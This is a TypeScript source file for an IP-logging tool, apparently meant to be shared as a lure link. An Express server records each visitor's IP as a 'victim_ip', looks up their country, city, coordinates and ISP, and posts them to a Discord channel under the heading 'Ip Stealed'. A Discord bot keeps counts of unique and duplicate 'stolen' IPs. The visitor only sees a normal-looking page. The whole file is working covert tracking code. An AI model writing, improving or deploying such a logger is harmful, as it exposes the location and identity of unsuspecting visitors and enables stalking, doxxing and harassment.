
import { EmbedBuilder, Client, IntentsBitField, Partials } from 'discord.js';
import superagent from 'superagent';
import express from 'express';
import { QuickDB } from 'quick.db';

import "colors";

const client = new Client({ intents: new IntentsBitField(3276799), partials: [Partials.Message, Partials.Channel, Partials.Reaction] });
const app = express();
const db = new QuickDB();
let privacy = require('./config').default;

const config = {
    BOT_TOKEN: privacy.token,
    BOT_PREFIX: privacy.botPrefix,
    WEBSITE_PORT: privacy.sitePort,
    CHANNEL_ID: privacy.channelId
};

console.log("[LOADING]".green + " >>".yellow + " launch program...");

app.get('/', async function (req: any, res: any) {

    var ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
    var victim_ip = ip.replace('::ffff:', '');
    var checker: Array<string> = (await db.get("saved_ip"))?.ips;

    if (!checker?.includes(victim_ip)) {
        superagent
            .post(`http://ip-api.com/json/${victim_ip}`)
            .end((err, response) => {
                console.log(response.body)
                let embed = new EmbedBuilder()
                    .setTitle('[HIT] Ip Stealed !')
                    .setColor('#000000')
                    .setFields({ name: 'Ip', value: victim_ip, inline: true },
                        { name: 'Country', value: response.body.country || 'Unknow', inline: true },
                        { name: 'Timezone', value: response.body.timezone || 'Unknow', inline: true },
                        { name: 'Lat/Lon', value: `Latitude: ${response.body.lat || 'Unknow'} | Longitude: ${response.body.lon || 'Unknow'}`, inline: true },
                        { name: 'City', value: response.body.city || 'Unknow', inline: true },
                        { name: 'Region Name', value: response.body.regionName || 'Unknow', inline: true },
                        { name: 'InternetProvider', value: response.body.as || 'Unknow', inline: true }
                    );

                let channel: any = client.channels.cache.get(config.CHANNEL_ID)
                channel?.send({ embeds: [embed] });
            });

        await db.push(`saved_ip.ips`, victim_ip);
        await db.add("counter.legit", 1);
        console.log("[HITED]".green + " >>".yellow + " adress ip saved and send to webhook.");

        return res.sendFile(`${process.cwd()}/index.html`);
    } else {
        console.log('This internet protcole (ip) has already logged in my database.');
        await db.add("counter.duplicata", 1);
        return res.sendFile(`${process.cwd()}/index.html`);
    }
});

client.on('ready', async () => {
    client.user?.setActivity(`Coded by my ass - ${config.BOT_PREFIX}help`);
});

client.on("messageCreate", async (message: {
    author: { bot: any; }; content: string; channel: {
        send: any; id: string;
    };
}) => {
    if (message.author.bot) return;

    if (!message.content.startsWith(config.BOT_PREFIX)) return;
    if (message.channel.id != config.CHANNEL_ID) return;

    let args = message.content.slice(config.BOT_PREFIX.length).trim().split(/ +/g);
    let command = args.shift()?.toLowerCase();

    if (command === 'help') {
        let embed = new EmbedBuilder()
            .setColor("#000000")
            .setDescription(`**${config.BOT_PREFIX}resetcounter - reset counter\n${config.BOT_PREFIX}showcounter - show counter\n${config.BOT_PREFIX}help - show this message**`);

        return message.channel.send({ embeds: [embed] });
    } else
        if (command === 'resetcounter') {
            await db.set('counter', {});
            return message.channel.send('tout les compteurs ont été remis à zéro.')
        } else
            if (command === 'showcounter') {
                let counter = await db.get("counter");

                var embed = new EmbedBuilder()
                    .setColor('#000000')
                    .setTimestamp()
                    .setFooter({ text: 'coded by my ass' })
                    .setDescription(`Voici les compteurs,\n**Ip unique volés: ${counter.legit || 0}**\n**Ip en doublon: ${counter.duplicata || 0}**`)
                return message.channel.send({ embeds: [embed] });
            };
});

app.listen(config.WEBSITE_PORT) && console.log("[STARTED]".green + " >>".yellow + " program has been started !");

client.login(config.BOT_TOKEN);